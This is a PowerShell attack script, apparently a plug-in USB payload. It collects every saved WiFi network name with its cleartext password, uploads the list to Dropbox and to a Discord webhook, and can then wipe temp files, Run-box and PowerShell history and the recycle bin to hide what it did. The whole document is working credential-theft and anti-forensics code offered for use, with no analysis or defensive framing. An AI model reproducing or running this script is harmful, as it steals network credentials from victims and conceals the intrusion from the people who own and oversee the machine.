# Capture WiFi profiles and passwords
$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String

# Save the WiFi profiles to a file
$wifiFilePath = "$env:TEMP\--wifi-pass.txt"
$wifiProfiles > $wifiFilePath

# Ensure the file is written and not empty before proceeding
if (Test-Path $wifiFilePath -and (Get-Content $wifiFilePath).Length -gt 0) {
    # Upload output file to Dropbox
    function DropBox-Upload {
        [CmdletBinding()]
        param (
            [Parameter (Mandatory = $True, ValueFromPipeline = $True)]
            [Alias("f")]
            [string]$SourceFilePath
        ) 
        $outputFile = Split-Path $SourceFilePath -leaf
        $TargetFilePath="/$outputFile"
        $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
        $authorization = "Bearer " + $db
        $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
        $headers.Add("Authorization", $authorization)
        $headers.Add("Dropbox-API-Arg", $arg)
        $headers.Add("Content-Type", 'application/octet-stream')
        Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
    }

    if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $wifiFilePath}

    # Upload file to Discord
    function Upload-Discord {
        [CmdletBinding()]
        param (
            [parameter(Position=0,Mandatory=$False)]
            [string]$file,
            [parameter(Position=1,Mandatory=$False)]
            [string]$text 
        )

        $hookurl = "$dc"

        $Body = @{
            'username' = $env:username
            'content' = $text
        }

        if (-not ([string]::IsNullOrEmpty($text))){
            Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
        }

        if (-not ([string]::IsNullOrEmpty($file))){
            curl.exe -F "file1=@$file" $hookurl
        }
    }

    if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $wifiFilePath}

    # Clean up exfil traces
    function Clean-Exfil { 
        # Empty temp folder
        rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

        # Delete run box history
        reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

        # Delete PowerShell history
        Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue

        # Empty recycle bin
        Clear-RecycleBin -Force -ErrorAction SilentlyContinue
    }

    if (-not ([string]::IsNullOrEmpty($ce))){Clean-Exfil}

    # Remove the WiFi password file
    Remove-Item $wifiFilePath -Force
}
